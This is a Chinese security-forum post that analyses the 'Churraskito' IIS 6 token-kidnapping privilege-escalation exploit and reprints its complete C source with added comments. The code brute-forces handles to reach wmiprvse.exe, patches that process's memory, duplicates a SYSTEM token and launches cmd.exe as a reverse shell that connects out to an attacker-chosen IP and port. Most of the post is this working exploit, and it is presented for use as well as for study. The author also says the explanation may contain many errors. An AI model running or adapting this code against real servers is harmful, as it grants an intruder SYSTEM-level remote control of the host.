
# 提权大杀器源代码分析报告\[最新修改\]

> 原文：[`www.pediy.com/kssd/pediy11/119809.html`](https://www.pediy.com/kssd/pediy11/119809.html)

BaCde：很希望能够得到大家的指点！或者评论！这里最新修改了。大家可以看一下！呵呵![](img/9b2aec7f3d4bb041b2d419a59832192f.jpg "恐怖!")![](img/45dd044a2743704cbb333715eae4a5f6.jpg "狂笑")

目标：分析并编写 WEB 版提权大杀器（分析的是 IIS6 的 exp）

分析人：BaCde

时间：2010 年 08 月 17 日 22 点 10 分

分析情况：

大家好，我是 BaCde，这次主要分析的是提权大杀器的代码，由于条件有限，在我的机子上无法测试，所以这里我只是把我的思路介绍一下！其中有可能（很大可能）存在着一些(甚至是大多数)逻辑问题以及一些常规错误，还希望大家来积极的指正。（我研究这个花了 3、4 天的时间，效率真是太低了！5555…..我得努力啊！）

看了一下关于漏洞的介绍，了解其主要存在的原因如下：

这个漏洞是由于在 `NetworkService` 或者 `LocalService` 下运行的代码，可以访问同样是在 `NetworkService` 或者 `LocalService` 下运行的进程，某些进程允许提升权限为 `LocalSystem`。

对于 Windows Server 2003，攻击者可以通过 `MSDTC` 获取 `token` 访问其他同样 `token` 的进程，从而可能造成提权。任何具有 `SeImpersonatePrivilege` 的进程都有可能造成提权。

我们这里主要弄明白的是怎样提升权限的。

后来我经过分析，提权的主要地方是 `SeImpersonatePrivilege` 这个也就是 `windowsNT` 中的一种特权，他是模拟后验证客户端，这个才是提权最主要的地方。关于绕过权限认证这方面，`Windows NT` 的核心主要就是权限---令牌---ACL，这里是比较容易出问题的，也就是 `acl`, `token`, and `privilege`。其中这里主要是权限（`privilege`）的出的问题，权限是系统赋予用户的一定的权力，它们允许或者不允许某些影响整个计算机系统而非某一对象的特权操作，以下是一些系统的权限：

1. `SeTcbPrivilege`
2. `SeMachineAccountPrivilege`
3. `SeBackupPrivilege`
4. `SeChangeNotifyPrivilege`
5. `SeSystemTimePrivilege`
6. `SeCreatePagefilePrivilege`
7. `SeCreateTokenPrivilege`
8. `SeCreatePermanentPrivilege`
9. `SeDebugPrivilege`
10. `SeEnableDelegationPrivilege`
11. `SeRemoteShutdownPrivilege`
12. `SeAuditPrivilege`
13. `SeIncreaseQuotaPrivilege`
14. `SeIncreaseBasePriorityPrivilege`
15. `SeLoadDriverPrivilege`
16. `SeLockMemoryPrivilege`
17. `SeSecurityPrivilege`
18. `SeSystemEnvironmentPrivilege`
19. `SeProfileSingleProcessPrivilege`
20. `SeSystemProfilePrivilege`
21. `SeUndockPrivilege`
22. `SeAssignPrimaryTokenPrivilege`
23. `SeRestorePrivilege`
24. `SeShutdownPrivilege`
25. `SeSynchAgentPrivilege`
26. `SeTakeOwnershipPrivilege`
27. `SeImpersonatePrivilege`

以上的中文意思大家可以自己查以下，我这里就不列出了，`windows` 中 `administrator` 主要是具有 20 项特权，其实利用特权可以做很多东西，例如我们关机的时候就使用了 `SeDebugPrivilege`，也就是调试特权！关于他的一些东西大家可以参看《关于 Windows 的权限和一些安全问题》。其中我们今天需要关注的就是 `SeImpersonatePrivilege`

关于 `SeImpersonatePrivilege` 的描述：

Requiring this privilege prevents an unauthorized user from convincing a client to connect to a service they have created and impersonating that client, which can elevate the unauthorized user's permissions to administrative or system levels. Note that assigning this privilege can be a security risk, so only assign it to trusted users.

允许程序对用户的名义运行来模拟客户端。这需要一个令人信服的特权阻止客户端连接到他们所创建和冒充服务未经授权的用户，客户端，它可以提升未经授权的用户的权限给予行政或系统水平。请注意，此权限可以分配一个安全风险，因此，只有将其分配给用户信赖。

也就是说如果想要提权，必须所模拟的那个进行必须具有 `SeImpersonatePrivilege` 权限。这样我们才可以复制一个句柄，然后在利用这个句柄来创建一个新的进程。

以下是以前的分析：

首先说一下程序的思路（是我的分析，不一定正确。），获取 `wmiprvse.exe` 进程的句柄，然后在以 `wmiprvse.exe` 进程的句柄创建一个相同的，然后获取新句柄用户中是 `system` 用户权限的，接这就是利用这个新创建的句柄使用 `CreateProcessAsUser` 函数创建一个执行我们的代码（进程，源代码给出的是提供一个反向的 shell.）。那么为什么这样就可以提权呢？我在一次查毒的过程中打开了 `Process Explorer` 查看进程时，下面的信息吸引了我（图 1），我们可以看到 `Token` 等信息，那么我们可以看到一个进程有多个 `token`，那么我们都知道，在 `windows` 中可以有多个用户，而每个用户都可以有多个组，例如我们经常添加 3389 管理管账户通常就属于两个组的分别是 `Users` 组和 `administrators` 组，由于我们 `admin` 组的权限大于 `Users` 组的权限，所以我们可以执行 `Users` 组用户权限的操作，也可以执行 `admin` 组权限的操作（这里是默认，排除用户自己设置 `NTFS` 权限的原因），也就是说同时属于 `Users` 组和 `Admin` 组的用户，那么用户的权限受属于权限较大的影响！反过来，一个进程有多个 `Token` 那么，有属于 `NetworkService` 也有属于 `LocalSystem` 的，那么，我们以 `NetworkService` 权限运行的进程就可以访问这个进程，然后通过复制进程的句柄，然后我们去查找这个句柄中是 `LocalSystem` 的权限的用户名复制一个句柄，然后以这个句柄来使用 `CreateProcessAsUser` 函数来建立一个进程。这样我们的新创建的进程就是 `LocalSystem` 的权限了！

这份代码中使用 `for` 循环的方式来猜解进程的句柄，原因可能是因为权限的问题吧！

当然，在这其中进行了一些操作！例如注册表操作、`wmi` 操作、修改内存操作。其中我不明白的就是操作内存的那个是什么作用。这是我第一次写东西。没什么经验，也不知道该怎么写，自己也没文采,所以就按照自己的方式写了，写的很烂，希望大家不要丢鸡蛋啊。^_^.哪里不足的,希望大家能够慷慨的指出,我好及时改正!呵呵!当然这里我在原来的代码上加入了注释！

涉及到的一些资料出处：

一些关于结构的信息，还有一些函数是在百度百科和百度文库找到的！主要有：

`STARTUPINFO` 结构信息

`WMI` 信息

`DuplicateHandle` 函数

`GetEnvironmentVariable` 函数

`CoCreateInstance` 函数

查看进程令牌信息源代码 来自黑客基地

模拟连接的客户端

`windows sdk` 编程系列文章 ---- 浅析 `windows` 安全策略

`MS Windows Token Kidnapping` 本地提权的解决方案 马俊的 `blog`

`InsomniaShell ASPX` 版的 `shell` 后门创建工具 暗组

`Searching for a SID in an Access Token in C++`

进程令牌(TOKEN)相关! `huangyong19870618` 的专栏 - `CSDN` 博客

注：以上我没有记连接，不过根据标题使用 `google` 可以很容易就可以找到！

## 上传的附件

| ![](img/1baac1a3eff5ac15dae6f33dccc134d9.jpg) || `Source.zip` |
| ![](img/668feaf58c8e7ddb6fbdbf839a5a19db.jpg) || `BlackHat-USA-2010-Cerrudo-Toke-Kidnapping's-Revenge-slides.pdf` |
| ![](img/668feaf58c8e7ddb6fbdbf839a5a19db.jpg) || `BlackHat-USA-2010-Cerrudo-Toke-Kidnapping's-Revenge-wp.pdf` |
| ![](img/58e0728fcb44eb7297cf87d68539ed4e.jpg) || `提权大杀器源代码分析报告.doc` |

写了一些注释！呵呵！欢迎大家指正！![](img/9b2aec7f3d4bb041b2d419a59832192f.jpg "恐怖!")

加了注释代码如下（主要是对 `main` 入口函数进行了详细的注释）：

```c
// Churraskito -> IIS 6 exploit
// by Cesar Cerrudo
// Argeniss - Information Security & Software
// Note: The IIS application pool identity should be Network Service (default) for this exploit to work
// if it's Local Service then some minor changes must be performed on the code
//该利用工具并非执行命令，而是提供一个反弹的 shell

#include "stdafx.h"

//这里应该是获取用户令牌的类型

BOOL IsImpersonationToken (HANDLE hToken, CHAR * cType)
{
    DWORD ReturnLength;
    SECURITY_IMPERSONATION_LEVEL TokenImpInfo;
    TOKEN_TYPE TokenTypeInfo;

    if(GetTokenInformation(hToken, TokenType, &TokenTypeInfo, sizeof(TokenTypeInfo), &ReturnLength)){
        if (TokenTypeInfo==TokenImpersonation) {
            if((GetTokenInformation(hToken, TokenImpersonationLevel, &TokenImpInfo, sizeof(TokenImpInfo), &ReturnLength)&& TokenImpInfo==SecurityImpersonation)){
                if (cType) *cType='I';
                return TRUE;
            }
        }
        else {
            if (cType) *cType='P'; //it's a primary token, TokenTypeInfo==TokenPrimary
            return TRUE;
        }
    }

    return FALSE;
}

BOOL GetTokenUser(HANDLE hToken, LPTSTR UserName)
{
    DWORD dwBufferSize = 0;
    SID_NAME_USE SidNameUse;
    TCHAR DomainName[MAX_PATH];
    DWORD dwUserNameSize= MAX_PATH * 2 ;
    DWORD dwDomainNameSize = MAX_PATH * 2;
    PTOKEN_USER pTokenUser;

    GetTokenInformation(hToken, TokenUser, NULL,0,&dwBufferSize);
    pTokenUser = (PTOKEN_USER) new BYTE[dwBufferSize];
    memset(pTokenUser, 0, dwBufferSize);

    if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwBufferSize, &dwBufferSize)){
        if (LookupAccountSid(NULL,pTokenUser->User.Sid,UserName,&dwUserNameSize,DomainName,&dwDomainNameSize,&SidNameUse)){
            return TRUE;
        }
    }

    return FALSE;
}

//调用 wmi
void InvokeWMI(){
    HRESULT hRes;
    _bstr_t bstrServer;
    IWbemLocatorPtr spLocator;
    IWbemServicesPtr spServices;
    IEnumWbemClassObjectPtr spEnum;
    IWbemClassObjectPtr spObject;

    CoInitialize(NULL);

    // create WBEM locator object
    //创建 WBEM
    hRes = CoCreateInstance(__uuidof(WbemLocator), NULL,
                            CLSCTX_INPROC_SERVER, __uuidof(IWbemLocator),
                            (PVOID *)&spLocator);
    if (FAILED(hRes))
        _com_issue_error(hRes);

    hRes = spLocator->ConnectServer(_bstr_t(L"root\\MicrosoftIISv2"), NULL, NULL, NULL, 0, NULL, NULL, &spServices);

    if (FAILED(hRes))
        _com_issue_error(hRes);

    // create enumerator
        IEnumWbemClassObject* pEnumerator = NULL;
    hRes = spServices->ExecQuery(
        bstr_t("WQL"),
        bstr_t("SELECT * FROM IIsWebInfo"),
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
        NULL,
        &pEnumerator);
}

HANDLE GetWMIProcHandle(){
    TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
    HANDLE hProcess;
```



```c
HMODULE hMod;

DWORD cbNeeded;

//使用循环来猜 wmiprvse.exe 的句柄

for (DWORD i=0;i<0xffff;i+=4){
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, i );
    if (hProcess)
    {
        if ( EnumProcessModules( hProcess, &hMod, sizeof(hMod),    &cbNeeded) )
        {
            GetModuleBaseName( hProcess, hMod, szProcessName,
                              sizeof(szProcessName)/sizeof(TCHAR) );
            if (!strcmp(szProcessName,"wmiprvse.exe")){
               printf ("/Churraskito/-->Got WMI process Pid: %d <BR>",i);
               return hProcess;
            }
        }
        CloseHandle(hProcess);
    }
}

return 0;

}

void PatchProc(HANDLE hProc){
    DWORD dwOldProt;
    char Buff[]="\\xc2\\x04\\x00";
    char Buff2[]="\\x6a\\x0c\\x90";
    LPVOID lpAddress;
    VirtualProtectEx(hProc,CloseHandle,0x3,PAGE_EXECUTE_READWRITE,&dwOldProt);
    WriteProcessMemory(hProc,CloseHandle,Buff,0x3,NULL);
    VirtualProtectEx(hProc,CloseHandle,0x3,dwOldProt,&dwOldProt);
    lpAddress=(LPVOID)((DWORD)OpenThreadToken+0xb);
    VirtualProtectEx(hProc,lpAddress,0x3,PAGE_EXECUTE_READWRITE,&dwOldProt);
    WriteProcessMemory(hProc,lpAddress,Buff2,0x3,NULL);
    VirtualProtectEx(hProc,lpAddress,0x3,dwOldProt,&dwOldProt);
}

void RestoreProc(HANDLE hProc){
    DWORD dwOldProt;
    char Buff[]="\\xc2\\x04\\x00";
    VirtualProtectEx(hProc,CloseHandle,0x3,PAGE_EXECUTE_READWRITE,&dwOldProt);
    WriteProcessMemory(hProc,CloseHandle,Buff,0x3,NULL);
    VirtualProtectEx(hProc,CloseHandle,0x3,dwOldProt,&dwOldProt);
}

DWORD WINAPI ThreadProc(LPVOID lpParameter){
    while (1==1){
        InvokeWMI();
        Sleep(20000);
    }
}
```

//反弹 Shell 函数

```c
DWORD SpawnReverseShell(HANDLE hToken, DWORD dwPort,LPSTR sIP)
{
    HANDLE hToken2,hTokenTmp;
    PROCESS_INFORMATION pInfo;
    STARTUPINFO        sInfo;
    WSADATA wd;
    SOCKET sock;
    struct sockaddr_in sin;
    int size = sizeof(sin);
    memset(&sin, 0, sizeof(sin));
    WSAStartup(MAKEWORD( 1, 1 ), &wd);
    sock=WSASocket(PF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    sin.sin_family = AF_INET;
    bind(sock, (struct sockaddr*)&sin, size);
    sin.sin_port = htons(dwPort);
    sin.sin_addr.s_addr = inet_addr(sIP);
    DWORD dwRes=connect(sock, (struct sockaddr*)&sin, size);
    if (dwRes!=0){
        printf ("/Churraskito/-->Could not connect to %s<BR>",sIP);
        return 0;
    }
    //以上代码为反向连接的 shell，需要事先在本地用 NC 监听端口
    ZeroMemory(&sInfo, sizeof(STARTUPINFO));
    ZeroMemory(&pInfo, sizeof(PROCESS_INFORMATION));
    sInfo.cb= sizeof(STARTUPINFO);
    sInfo.lpDesktop= "WinSta0\\\\Default"; //so we don't have to wait on the process
    sInfo.dwFlags = STARTF_USESTDHANDLES;
    sInfo.hStdInput = sInfo.hStdOutput = sInfo.hStdError =(HANDLE) sock;
    CHAR cType;
    IsImpersonationToken(hToken, &cType);
    if (cType=='I'){
        SetThreadToken(NULL, hToken);
        OpenThreadToken(GetCurrentThread(),TOKEN_ALL_ACCESS,FALSE,&hTokenTmp);
        SetThreadToken(NULL, NULL);
    }
    else
        hTokenTmp=hToken;
    DuplicateTokenEx(hTokenTmp,MAXIMUM_ALLOWED,NULL,SecurityImpersonation, TokenPrimary,&hToken2) ;
    LPTSTR lpComspec;
    lpComspec= (LPTSTR) malloc(1024*sizeof(TCHAR));
    GetEnvironmentVariable("comspec",lpComspec,1024);//it won't work if cmd.exe used as commandline param
    dwRes=CreateProcessAsUser(hToken2, lpComspec ,NULL, NULL, NULL, TRUE, NULL, NULL, NULL, &sInfo, &pInfo);
    if (hTokenTmp!=hToken)
        CloseHandle(hTokenTmp);
    CloseHandle(hToken2);
    return dwRes;
}
```

```c
bool SetRegistryValues()
{
    HKEY hKey;
    DWORD x=0x0;
    bool result=false;
    //创建注册表{1F87137D-0E7C-44d5-8C73-4EFFB68962F2}
    if( RegCreateKeyEx(HKEY_USERS,TEXT("S-1-5-20_Classes\\\\AppID\\\\{1F87137D-0E7C-44d5-8C73-4EFFB68962F2}"),NULL,NULL,NULL,KEY_ALL_ACCESS,NULL, &hKey,NULL) == ERROR_SUCCESS )
    {
        if (RegSetValueEx(hKey,"AppIDFlags",NULL,REG_DWORD,(PBYTE)&x,sizeof(DWORD))== ERROR_SUCCESS )
        {
            result=true;
        }
    RegCloseKey(hKey);
    }
    return result;
}
```

```c
bool DelRegistrySubkeys()
{
    bool result=false;
    //删除注册表操作
    if( RegDeleteKey(HKEY_USERS,TEXT("S-1-5-20_Classes\\\\AppID\\\\{1F87137D-0E7C-44d5-8C73-4EFFB68962F2}")) == ERROR_SUCCESS )
    {
        if( RegDeleteKey(HKEY_USERS,TEXT("S-1-5-20_Classes\\\\AppID")) == ERROR_SUCCESS )
        {
            result=true;
        }
    }
    return result;
}
```

```c
int _tmain(int argc, _TCHAR* argv[])
{
    HANDLE hToken,hTokenOut;
    TCHAR UserName[32767];
    DWORD lpThreadId;
    DWORD dwPort;
    LPSTR sIP;
    HANDLE hProc;
    printf ("/Churraskito/-->This exploit gives you a Local System shell <BR>");
    //帮助提示 Usage()
    if (argc != 3) {
        printf ("/Churraskito/-->Usage: Churraskito.exe ipaddress port <BR>");
        return 0;
    }
    sIP= argv[1];
    dwPort= atoi(argv[2]);
    //写注册表操作
    //创建 HKU 下的 AppId\{1F87137D-0E7C-44d5-8C73-4EFFB68962F2}\AppIdFlags 为 0x0000000
    if (!SetRegistryValues()) {
        printf ("/Churraskito/-->Could not set registry values<BR>");
        return 0;
    }
    //创建一个线程线程执行 InvokeWMI()
    //由于下面要获取 wmiprvse.exe 进程句柄，所以需要先进行 wmi 操作
    CreateThread(NULL,NULL,ThreadProc,NULL,NULL,&lpThreadId);
    Sleep(500);            //等待 500 毫秒
    //获取句柄
    hProc=GetWMIProcHandle();
    //如果获取句柄成功
    if (hProc){
        PatchProc(hProc);
        while (1==1){
            for (DWORD j=0x4;j<=0x400;j+=4){
                //hToken 为 指定对象的现有句柄
                hToken=(HANDLE)j;
                //以 wmiprvse 的句柄来创建一个新句柄
                //该句柄有可能在其他进程
                if (DuplicateHandle(hProc,hToken,GetCurrentProcess(),&hTokenOut,0,FALSE,DUPLICATE_SAME_ACCESS )){
                    //
                    if (IsImpersonationToken(hTokenOut, NULL) ){
                        //获取新句柄的用户名
                        if(GetTokenUser(hTokenOut, UserName)){
                            printf ("/Churraskito/-->Found token %s <BR>",UserName);
                            if (!strcmp(UserName,"SYSTEM")){
                                DelRegistrySubkeys();      //删除注册表
                                printf ("/Churraskito/-->Running reverse shell<BR>");
                                //反向连接
                                SpawnReverseShell(hTokenOut,dwPort,sIP);
                                return 0;
                            }
                        }
                    }
                    CloseHandle(hTokenOut);
                }
            }
```



```
Sleep(500);
}
CloseHandle(hProc);
}
return 0;
}
```
